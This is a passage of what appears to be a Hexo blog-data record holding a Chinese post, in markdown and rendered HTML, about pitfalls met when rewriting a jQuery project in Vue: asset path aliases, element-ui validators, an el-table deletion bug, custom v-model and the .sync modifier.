v-model 使用\n\n一个组件上的 v-model 默认会利用名为 value 的 prop 和名为 input 的事件，但是像单选框、复选框等类型的输入控件可能会将 value 特性用于不同的目的。model 选项可以用来避免这样的冲突：\n\n```HTML\n<my-checkbox v-model=\"foo\" value=\"some value\"></my-checkbox>\n```\n\n```JS\nVue.component('my-checkbox', {\n  model: {\n    prop: 'checked',\n    event: 'change'\n  },\n  props: {\n    // this allows using the `value` prop for a different purpose\n    value: String,\n    // use `checked` as the prop which take the place of `value`\n    checked: {\n      type: Number,\n      default: 0\n    }\n  },\n  // ...\n})\n```\n\n## sync 修饰符\n\n原以为加了 sync 的 prop 就可以像普通的 data 定义变量一样使用，结果当然是错的。其实只是一种针对通过自定义事件修改 prop 的一种简写。使用这种简写的前提是约定自定义事件名为`update:xxx`，其实只是通过约定，减少了传入事件函数，对于子组件还是需要调用`$emit`方法去触发。示例如下：\n\n```html\n<text-document\n  v-bind:title=\"doc.title\"\n  v-on:update:title=\"doc.title = $event\"\n></text-document>\n<!-- 可以简写成这样： -->\n<text-document v-bind:title.sync=\"doc.title\"></text-document>\n```\n\n```js\n// 子组件中触发赋值意图\nthis.$emit(\"update:title\", newTitle);\n```\n","source":"_posts/2019/08/Vue重构jQuery项目经验总结一.md","raw":"---\ntitle: Vue重构jQuery项目经验总结一\npermalink: Vue-restructure-jQuery-1\ntags:\n  - Vue\n  - jQuery\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-08-09 09:28:02\nupdated: 2019-08-09 09:28:02\n---\n\n# 概述\n\n用 Vue 生态重构已有的老项目（jsp+jquery），针对目前实践中遭遇的一些坑，做下小结。具体包括：URL 转换规则、element-ui 自定义校验、`el-table`组件删除问题、自定义组件`v-model`使用和`sync`修饰符。\n\n<!-- more -->\n\n# 详述\n\n初始化项目直接用的 vue-cli，安装全家桶（router、vuex），代码规范选用的 Prettier，配置文件选择放在单独文件，ui 库用 element-ui。\n\n## URL 转换规则\n\n对于资源的引用路径，可以用相对路径，也可以用绝对路径，但是实际中，对于嵌套太深的一般使用绝对路径比较合适。在 vue-cli 初始化的项目中默认设置了`@`别名作为 src 根目录，当然我们也可以在 webpack 配置文件中设置更多的别名。\n\n在 js 中引用资源的相对路径与绝对路径示例如下：\n\n```js\n// 简洁\nimport MainTitle from \"@/components/MainTitle\";\n// 复杂，容易搞错层级\nimport MainTitle from \"../../../components/MainTitle\";\n```\n\n既然使用别名这么方便，那么在 css 中引用图片也这样搞吧:\n\n```scss\n.select-flag {\n  &:before {\n    content: \"\";\n    width: 16px;\n    height: 11px;\n    display: inline-block;\n    margin-right: 5px;\n    font-size: 0;\n    background: url(\"@/assets/milan/common/img/icon/flags.png\") no-repeat;\n  }\n}\n```\n\n结果报错如下：\n\n```\nFailed to compile.\n\n./src/components/CountrySelect/index.vue?vue&type=style&index=0&id=432f6435&lang=scss&scoped=true& (./node_modules/css-loader??ref--8-oneOf-1-1!./node_modules/vue-loader/lib/loaders/stylePostLoader.js!./node_modules/postcss-loader/src??ref--8-oneOf-1-2!./node_modules/sass-loader/lib/loader.js??ref--8-oneOf-1-3!./node_modules/cache-loader/dist/cjs.js??ref--0-0!./node_modules/vue-loader/lib??vue-loader-options!./src/components/CountrySelect/index.vue?vue&type=style&index=0&id=432f6435&lang=scss&scoped=true&)\nModule not found: Error: Can't resolve './@/assets/milan/common/img/icon/flags.png' in 'H:\\workspace\\vue\\venice\\src\\components\\CountrySelect'\n```\n\n细看这个报错信息，可知 css-loader 编译时没有找到引用的资源。解决方式为：`background: url(\"~@/assets/milan/common/img/icon/flags.png\") no-repeat;`。原因是，`@`与`~`开头都会作为一个模块请求被解析，但是`@`开头仅作用域模板中。详细见[官网](https://cli.vuejs.org/zh/guide/html-and-static-assets.html#url-%E8%BD%AC%E6%8D%A2%E8%A7%84%E5%88%99)。\n\n## element-ui 自定义校验\n\nelement 的表单校验与 ant-d 一样都是用的第三方库[async-validator\n](https://github.com/yiminghe/async-validator/blob/master/README.md)。因为 element-ui 官网这块只是一带而过，详细的还是要查看该集成库的文档。下面以自定义同步校验与异步校验为例：\n\n```js\n  ...\n  data() {\n\n    var phoneRepeat = (rule, value, callback) => {\n      request({\n        url: \"/api/account/phoneRepeat\",\n        method: \"post\",\n        params: { regionId: this.ruleForm.regionId, phone: value }\n      }).then(response => {\n        let result = response.data;\n        if (result.code == \"10002\") {\n          callback(new Error(rule.message));\n        } else {\n          callback();\n        }\n      });\n    };\n    var telNumCn = (rule, value, callback) => {\n      var reg = /^1\\d{10}$/;\n      if (this.ruleForm.regionId === \"China\" && !reg.test(value)) {\n        callback(new Error(rule.message));\n      } else {\n        callback();\n      }\n    };\n\n    return {\n      titleTxt: \"管理子账户 \",\n      titleDesc: \"仅提供业务员身份的子账户，用于管理除资金以外的所有权限。\",\n      ruleForm: {\n        type: \"01\",\n        name: \"\",\n        email: \"\",\n        regionId: \"China\",\n        phone: \"\",\n        password: \"\",\n        repeatpwd: \"\"\n      },\n      rules: {\n        phone: [\n          {\n            required: true,\n            message: \"请输入手机号码。\",\n            trigger: \"blur\"\n          },\n          {\n            validator: telNumCn,\n            required: true,\n            message: \"请提供有效的中国大陆手机号码。\",\n            trigger: \"blur\"\n          },\n          {\n            validator: phoneRepeat,\n            required: true,\n            message: \"此手机已被作为安全手机使用过，请更换。\",\n            trigger: \"blur\"\n          }\n        ]\n      }\n    };\n  },\n  ...\n```\n\n想着校验函数复用，一开始根据 element 示例，想着用一个高阶函数传入 message 生成 validator 函数。后来发现`rule`参数就是指向我们配置的规则对象，因此直接在 rules 中配置 message 即可，当然也可以增加其他参数供 validator 函数使用。\n\n## `el-table`组件删除问题\n\n问题很小，就是用了官方示例，删除成功，但是不是对应的那一条：\n![效果图](GIF.gif)\n检查代码：\n\n```html\n<el-table\n  :data=\"tableData\"\n  style=\"width: 100%\"\n  :default-sort=\"{prop: 'name', order: 'descending'}\"\n>\n  <el-table-column prop=\"name\" label=\"姓名\" sortable sort-by=\"name\" />\n  <el-table-column prop=\"type\" label=\"类型\" />\n  <el-table-column prop=\"email\" label=\"登录邮箱\" />\n  <el-table-column prop=\"phone\" label=\"安全手机\" />\n  <el-table-column prop=\"time\" label=\"添加时间\" sortable sort-by=\"time\" />\n  <el-table-column label=\"操作\" width=\"100\">\n    <template v-slot=\"scope\">\n      <el-button type=\"text\" @click=\"handleEdit(scope.$index, scope.row)\"\n        >编辑</el-button\n      >\n      <el-button type=\"text\" @click=\"handleDelete(scope.$index, scope.row)\"\n        >删除</el-button\n      >\n    </template>\n  </el-table-column>\n</el-table>\n```\n\n```js\n    handleDelete(index, row) {\n      ...\n      this.tableData.splice(index, 1);\n      ...\n    }\n```\n\n没啥问题啊。唉！最后发现加了默认排序，导致展示的顺序与实际的数据顺序不一致，当然根据索引删除也就对不上号了。因此，有排序的，只能通过唯一性的字段，如id，来进行查询筛选了。\n\n## 自定义组件 v-model 使用\n\n一个组件上的 v-model 默认会利用名为 value 的 prop 和名为 input 的事件，但是像单选框、复选框等类型的输入控件可能会将 value 特性用于不同的目的。model 选项可以用来避免这样的冲突：\n\n```HTML\n<my-checkbox v-model=\"foo\" value=\"some value\"></my-checkbox>\n```\n\n```JS\nVue.component('my-checkbox', {\n  model: {\n    prop: 'checked',\n    event: 'change'\n  },\n  props: {\n    // this allows using the `value` prop for a different purpose\n    value: String,\n    // use `checked` as the prop which take the place of `value`\n    checked: {\n      type: Number,\n      default: 0\n    }\n  },\n  // ...\n})\n```\n\n## sync 修饰符\n\n原以为加了 sync 的 prop 就可以像普通的 data 定义变量一样使用，结果当然是错的。其实只是一种针对通过自定义事件修改 prop 的一种简写。使用这种简写的前提是约定自定义事件名为`update:xxx`，其实只是通过约定，减少了传入事件函数，对于子组件还是需要调用`$emit`方法去触发。示例如下：\n\n```html\n<text-document\n  v-bind:title=\"doc.title\"\n  v-on:update:title=\"doc.title = $event\"\n></text-document>\n<!-- 可以简写成这样： -->\n<text-document v-bind:title.sync=\"doc.title\"></text-document>\n```\n\n```js\n// 子组件中触发赋值意图\nthis.$emit(\"update:title\", newTitle);\n```\n","slug":"Vue-restructure-jQuery-1","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d91300ahwovvb5y4lwq2","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>用 Vue 生态重构已有的老项目（jsp+jquery），针对目前实践中遭遇的一些坑，做下小结。具体包括：URL 转换规则、element-ui 自定义校验、<code>el-table</code>组件删除问题、自定义组件<code>v-model</code>使用和<code>sync</code>修饰符。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>初始化项目直接用的 vue-cli，安装全家桶（router、vuex），代码规范选用的 Prettier，配置文件选择放在单独文件，ui 库用 element-ui。</p>\n<h2 id=\"URL-转换规则\"><a href=\"#URL-转换规则\" class=\"headerlink\" title=\"URL 转换规则\"></a>URL 转换规则</h2><p>对于资源的引用路径，可以用相对路径，也可以用绝对路径，但是实际中，对于嵌套太深的一般使用绝对路径比较合适。在 vue-cli 初始化的项目中默认设置了<code>@</code>别名作为 src 根目录，当然我们也可以在 webpack 配置文件中设置更多的别名。</p>\n<p>在 js 中引用资源的相对路径与绝对路径示例如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 简洁</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> MainTitle <span class=\"keyword\">from</span> <span class=\"string\">\"@/components/MainTitle\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 复杂，容易搞错层级</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> MainTitle <span class=\"keyword\">from</span> <span class=\"string\">\"../../../components/MainTitle\"</span>;</span><br></pre></td></tr></table></figure>\n<p>既然使用别名这么方便，那么在 css 中引用图片也这样搞吧:</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.select-flag</span> &#123;</span><br><span class=\"line\">  &amp;:before &#123;</span><br><span class=\"line\">    <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">11px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">    <span class=\"attribute\">margin-right</span>: <span class=\"number\">5px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: url(<span class=\"string\">\"@/assets/milan/common/img/icon/flags.png\"</span>) no-repeat;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结果报错如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Failed to compile.</span><br><span class=\"line\"></span><br><span class=\"line\">./src/components/CountrySelect/index.vue?vue&amp;type=style&amp;index=0&amp;id=432f6435&amp;lang=scss&amp;scoped=true&amp; (./node_modules/css-loader??ref--8-oneOf-1-1!./node_modules/vue-loader/lib/loaders/stylePostLoader.js!./node_modules/postcss-loader/src??ref--8-oneOf-1-2!./node_modules/sass-loader/lib/loader.js??ref--8-oneOf-1-3!./node_modules/cache-loader/dist/cjs.js??ref--0-0!./node_modules/vue-loader/lib??vue-loader-options!./src/components/CountrySelect/index.vue?vue&amp;type=style&amp;index=0&amp;id=432f6435&amp;lang=scss&amp;scoped=true&amp;)</span><br><span class=\"line\">Module not found: Error: Can&apos;t resolve &apos;./@/assets/milan/common/img/icon/flags.png&apos; in &apos;H:\\workspace\\vue\\venice\\src\\components\\CountrySelect&apos;</span><br></pre></td></tr></table></figure>\n<p>细看这个报错信息，可知 css-loader 编译时没有找到引用的资源。解决方式为：<code>background: url(&quot;~@/assets/milan/common/img/icon/flags.png&quot;) no-repeat;</code>。原因是，<code>@</code>与<code>~</code>开头都会作为一个模块请求被解析，但是<code>@</code>开头仅作用域模板中。详细见<a href=\"https://cli.vuejs.org/zh/guide/html-and-static-assets.html#url-%E8%BD%AC%E6%8D%A2%E8%A7%84%E5%88%99\" target=\"_blank\" rel=\"noopener\">官网</a>。</p>\n<h2 id=\"element-ui-自定义校验\"><a href=\"#element-ui-自定义校验\" class=\"headerlink\" title=\"element-ui 自定义校验\"></a>element-ui 自定义校验</h2><p>element 的表单校验与 ant-d 一样都是用的第三方库<a href=\"https://github.com/yiminghe/async-validator/blob/master/README.md\" target=\"_blank\" rel=\"noopener\">async-validator\n</a>。因为 element-ui 官网这块只是一带而过，详细的还是要查看该集成库的文档。下面以自定义同步校验与异步校验为例：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">data() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> phoneRepeat = <span class=\"function\">(<span class=\"params\">rule, value, callback</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    request(&#123;</span><br><span class=\"line\">      url: <span class=\"string\">\"/api/account/phoneRepeat\"</span>,</span><br><span class=\"line\">      method: <span class=\"string\">\"post\"</span>,</span><br><span class=\"line\">      params: &#123; <span class=\"attr\">regionId</span>: <span class=\"keyword\">this</span>.ruleForm.regionId, <span class=\"attr\">phone</span>: value &#125;</span><br><span class=\"line\">    &#125;).then(<span class=\"function\"><span class=\"params\">response</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> result = response.data;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (result.code == <span class=\"string\">\"10002\"</span>) &#123;</span><br><span class=\"line\">        callback(<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(rule.message));</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        callback();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> telNumCn = <span class=\"function\">(<span class=\"params\">rule, value, callback</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> reg = <span class=\"regexp\">/^1\\d&#123;10&#125;$/</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.ruleForm.regionId === <span class=\"string\">\"China\"</span> &amp;&amp; !reg.test(value)) &#123;</span><br><span class=\"line\">      callback(<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(rule.message));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      callback();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    titleTxt: <span class=\"string\">\"管理子账户 \"</span>,</span><br><span class=\"line\">    titleDesc: <span class=\"string\">\"仅提供业务员身份的子账户，用于管理除资金以外的所有权限。\"</span>,</span><br><span class=\"line\">    ruleForm: &#123;</span><br><span class=\"line\">      type: <span class=\"string\">\"01\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">      email: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">      regionId: <span class=\"string\">\"China\"</span>,</span><br><span class=\"line\">      phone: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">      password: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">      repeatpwd: <span class=\"string\">\"\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    rules: &#123;</span><br><span class=\"line\">      phone: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          required: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          message: <span class=\"string\">\"请输入手机号码。\"</span>,</span><br><span class=\"line\">          trigger: <span class=\"string\">\"blur\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          validator: telNumCn,</span><br><span class=\"line\">          required: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          message: <span class=\"string\">\"请提供有效的中国大陆手机号码。\"</span>,</span><br><span class=\"line\">          trigger: <span class=\"string\">\"blur\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          validator: phoneRepeat,</span><br><span class=\"line\">          required: <span class=\"literal\">true</span>,</span><br><span class=\"line\">          message: <span class=\"string\">\"此手机已被作为安全手机使用过，请更换。\"</span>,</span><br><span class=\"line\">          trigger: <span class=\"string\">\"blur\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>想着校验函数复用，一开始根据 element 示例，想着用一个高阶函数传入 message 生成 validator 函数。后来发现<code>rule</code>参数就是指向我们配置的规则对象，因此直接在 rules 中配置 message 即可，当然也可以增加其他参数供 validator 函数使用。</p>\n<h2 id=\"el-table组件删除问题\"><a href=\"#el-table组件删除问题\" class=\"headerlink\" title=\"el-table组件删除问题\"></a><code>el-table</code>组件删除问题</h2><p>问题很小，就是用了官方示例，删除成功，但是不是对应的那一条：<br><img src=\"/Vue-restructure-jQuery-1/GIF.gif\" alt=\"效果图\"><br>检查代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">el-table</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">:data</span>=<span class=\"string\">\"tableData\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">style</span>=<span class=\"string\">\"width: 100%\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">:default-sort</span>=<span class=\"string\">\"&#123;prop: 'name', order: 'descending'&#125;\"</span></span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">prop</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">label</span>=<span class=\"string\">\"姓名\"</span> <span class=\"attr\">sortable</span> <span class=\"attr\">sort-by</span>=<span class=\"string\">\"name\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">prop</span>=<span class=\"string\">\"type\"</span> <span class=\"attr\">label</span>=<span class=\"string\">\"类型\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">prop</span>=<span class=\"string\">\"email\"</span> <span class=\"attr\">label</span>=<span class=\"string\">\"登录邮箱\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">prop</span>=<span class=\"string\">\"phone\"</span> <span class=\"attr\">label</span>=<span class=\"string\">\"安全手机\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">prop</span>=<span class=\"string\">\"time\"</span> <span class=\"attr\">label</span>=<span class=\"string\">\"添加时间\"</span> <span class=\"attr\">sortable</span> <span class=\"attr\">sort-by</span>=<span class=\"string\">\"time\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">el-table-column</span> <span class=\"attr\">label</span>=<span class=\"string\">\"操作\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"100\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">v-slot</span>=<span class=\"string\">\"scope\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">el-button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"handleEdit(scope.$index, scope.row)\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        &gt;</span>编辑<span class=\"tag\">&lt;/<span class=\"name\">el-button</span></span></span><br><span class=\"line\"><span class=\"tag\">      &gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">el-button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"handleDelete(scope.$index, scope.row)\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        &gt;</span>删除<span class=\"tag\">&lt;/<span class=\"name\">el-button</span></span></span><br><span class=\"line\"><span class=\"tag\">      &gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">el-table-column</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">el-table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">handleDelete(index, row) &#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.tableData.splice(index, <span class=\"number\">1</span>);</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>没啥问题啊。唉！最后发现加了默认排序，导致展示的顺序与实际的数据顺序不一致，当然根据索引删除也就对不上号了。因此，有排序的，只能通过唯一性的字段，如id，来进行查询筛选了。</p>\n<h2 id=\"自定义组件-v-model-使用\"><a href=\"#自定义组件-v-model-使用\" class=\"headerlink\" title=\"自定义组件 v-model 使用\"></a>自定义组件 v-model 使用</h2><p>一个组件上的 v-model 默认会利用名为 value 的 prop 和名为 input 的事件，但是像单选框、复选框等类型的输入控件可能会将 value 特性用于不同的目的。model 选项可以用来避免这样的冲突：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">my-checkbox</span> <span class=\"attr\">v-model</span>=<span class=\"string\">\"foo\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"some value\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">my-checkbox</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Vue.component(<span class=\"string\">'my-checkbox'</span>, &#123;</span><br><span class=\"line\">  model: &#123;</span><br><span class=\"line\">    prop: <span class=\"string\">'checked'</span>,</span><br><span class=\"line\">    event: <span class=\"string\">'change'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  props: &#123;</span><br><span class=\"line\">    <span class=\"comment\">// this allows using the `value` prop for a different purpose</span></span><br><span class=\"line\">    value: <span class=\"built_in\">String</span>,</span><br><span class=\"line\">    <span class=\"comment\">// use `checked` as the prop which take the place of `value`</span></span><br><span class=\"line\">    checked: &#123;</span><br><span class=\"line\">      type: <span class=\"built_in\">Number</span>,</span><br><span class=\"line\">      <span class=\"keyword\">default</span>: <span class=\"number\">0</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"sync-修饰符\"><a href=\"#sync-修饰符\" class=\"headerlink\" title=\"sync 修饰符\"></a>sync 修饰符</h2><p>原以为加了 sync 的 prop 就可以像普通的 data 定义变量一样使用，结果当然是错的。其实只是一种针对通过自定义事件修改 prop 的一种简写。使用这种简写的前提是约定自定义事件名为<code>update:xxx</code>，其实只是通过约定，减少了传入事件函数，对于子组件还是需要调用<code>$emit</code>方法去触发。示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">text-document</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">v-bind:title</span>=<span class=\"string\">\"doc.title\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">v-on:update:title</span>=<span class=\"string\">\"doc.title = $event\"</span></span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">text-document</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 可以简写成这样： --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">text-document</span> <span class=\"attr\">v-bind:title.sync</span>=<span class=\"string\">\"doc.title\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">text-document</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 子组件中触发赋值意图</span></span><br><span class=\"line\"><span class=\"keyword\">this</span>.$emit(<span class=\"string\">\"update:title\"</span>, newTitle);</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>用 Vue 生态重构已有的老项目（jsp+jquery），针对目前实践中遭遇的一些坑，做下小结。具体包括：URL 转换规则、element-ui 自定义校验、<code>el-table</code>组件删除问题、自定义组件<code>v-model</code>使用和<code>sync</code>修饰符。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>初始化项目直接用的 vue-cli，安装全家桶（router、vuex），代码规范选用的 